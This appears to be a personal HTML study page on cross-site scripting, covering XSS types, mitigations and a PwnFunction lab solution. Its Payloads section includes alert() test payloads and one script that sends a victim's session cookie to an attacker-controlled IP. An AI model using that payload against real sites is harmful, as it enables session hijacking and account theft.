<!DOCTYPE html>
<html>
    <head>
        <title>XSS</title>
        <link rel="icon" type="image/x-icon" href="../../Images/hacker.jpg">
        <link rel="stylesheet" href="../../styles/tokyo-night-dark.min.css">
        <link rel="stylesheet" href="../../styles/styles.css">
        <script src="../../styles/highlight.min.js"></script>
        <script>hljs.highlightAll();</script>

    </head>
    <body>
        <h1>Cross-site Scripting</h1>
        <hr>
        <h2>Table of Contents</h2>
        <ul>
            <li><a href="#sop">Same Origin Policy</a></li>
            <li><a href="#mitigations">Migations</a></li>
            <li><a href="#types">Types</a>
                <ul>
                    <li><a href="#reflected-xss">Reflected XSS</a></li>
                    <li><a href="#dom-xss">DOM-based XSS</a></li>
                    <li><a href="#stored-xss">Persistent/Stored XSS</a></li>
                    <li><a href="#blind-xss">Blind XSS</a></li>
                </ul>
            </li>
            <li><a href="#payloads">Payloads</a></li>
            <li><a href="#xss-challenges">XSS Challenges</a>
                <ul>
                    <li><a href="#pwn-function-challenges">PWN Function Challenges</a>
                        <ul>
                            <li><a href="#ma-spagheti">Ma Spaghet!</a></li>
                            <li><a href="#jefff">Jefff</a></li>
                            <li><a href="#ugandan-knuckles">Ugandan Knuckles</a></li>
                            <li><a href="#richardo-milos">Ricardo Milos</a></li>
                            <li><a href="#ah-thats-hawt">Ah That's Hawt</a></li>
                            <li><a href="#ligma">Ligma</a></li>
                            <li><a href="#mafia">Mafia</a></li>
                            <li><a href="#ok-boomer">Ok, Boomer</a></li>
                        </ul>
                    </li>
                </ul>
            </li>
            <!-- <li><a href="#"></a></li> -->
        </ul>   
        <hr>
        <h2 id="sop">Same Origin Policy</h2>
        <ul>
            <li>checks protocol, host, and port of a website</li>
            <li>if all those are the same then the brower allows the two pages to read/write to each other</li>
        </ul>
        <hr>
        <h2 id="mitigations">Migations</h2>
        <ul>
            <li>Use output encoding when including data into the HTML document</li>
            <li>DOMPurify library</li>
        </ul>
        <hr>
        <h2 id="types">Types</h2>
        <h3 id="reflected-xss">Reflected XSS</h3>
        <p>Input to a webpage is reflected back to the user in the response from the webserver</p>
        <ol>
            <li>user clicks malicious link (www.acme.com?message=`&lt;script&gt;evil()&lt;/script&gt;`)</li>
            <li>the web server by incorporate the value into the HTML document created for the user (Source code: <code>&lt;h1&gt;Hello {value of message}&lt;/h1&gt;</code>)</li>
            <li>the web server returns malicious document to the user (<code>&lt;h1&gt;&lt;script&gt;evil()&lt;/script&gt;&lt;/h1&gt;</code>)</li>
            <li>user's browser executes the script <code>&lt;script&gt;evil()&lt;/script&gt;</code></li>
        </ol>
        <h3 id="dom-xss">DOM-based XSS</h3>
        <p>User input lands in dangerous part of JS code</p>
        <ol>
            <li>user clicks malicious object on page (<code>&lt;span onmouseover='evil();'&gt;&lt;/span&gt;</code>)</li>
            <li>JS parses the input and incorporates into the page using the DOM (Source code: <code>&lt;h1&gt;Hello {value of message}&lt;/h1&gt;</code>)</li>
            <li>Browser executes script <code>evil()</code></li>
            <li>Note: vulnerability is entirely in the browser</li>
            <li>Look for usage of <code>innerHTML</code></li>
        </ol>
        <h3 id="stored-xss">Persistent/Stored XSS</h3>
        <p>Malicious JS is stored in the webserver and served to the user upon request</p>
        <ol>
            <li>Database is poisoned with an insertion of a script (Field: message, value: <code>&lt;script&gt;evil()&lt;/script&gt;</code>)</li>
            <li>The application server incorporates the value into the HTML document created for the user (Source code: <code>&lt;h1&gt;Hello {value of message}&lt;/h1&gt;</code>)</li>
            <li>Document generated by application: <code>&lt;h1&gt;Hello &lt;script&gt;evil()&lt;/script&gt;&lt;/h1&gt;</code></li>
            <li>User's browser executes <code>&lt;script&gt;evil()&lt;/script&gt;</code></li>
        </ol>
        <h3 id="blind-xss">Blind XSS</h3>
        <ul>
            <li>XSS an admin panel that you do not have access to</li>
        </ul>
        <hr>
        <h2 id="payloads">Payloads</h2>
        <pre><code class="language-html">&lt;!-- user alert(document.domain) --&gt;
&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;!-- self firing --&gt;
&lt;img src=x onerror=alert(1) /&gt;
&lt;svg onload=alert(1)&gt;&lt;/svg&gt;
&lt;!-- 192.168.0.192 is hacker's IP and they are listening on port 4444, this lets them access the session cookie --&gt;
&lt;script&gt;new Image().src = "http://192.168.0.192:4444/hacker.php?output="+document.cookie;&lt;/script&gt;</code></pre>
        <hr>
        <h2 id="xss-challenges">XSS Challenges</h2>
        <h3 id="pwn-function-challenges">PWN Function Challenges</h3>
        <h4 id="ma-spagheti">Ma Spaghet!</h4>
        <pre><code class="language-html">&lt;!-- Challenge --&gt;
&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;
&lt;script&gt;
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;
&lt;/script&gt;
&lt;!-- Payload --&gt;
&lt;!-- https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg%20onload=alert(1)%3E --&gt;
&lt;svg onload=alert(1)&gt;</code></pre>
        <h4 id="jefff">Jefff</h4>
        <h4 id="ugandan-knuckles">Ugandan Knuckles</h4>
        <h4 id="richardo-milos">Ricardo Milos</h4>
        <h4 id="ah-thats-hawt">Ah That's Hawt</h4>
        <h4 id="ligma">Ligma</h4>
        <h4 id="mafia">Mafia</h4>
        <h4 id="ok-boomer">Ok, Boomer</h4>

    </body>
</html>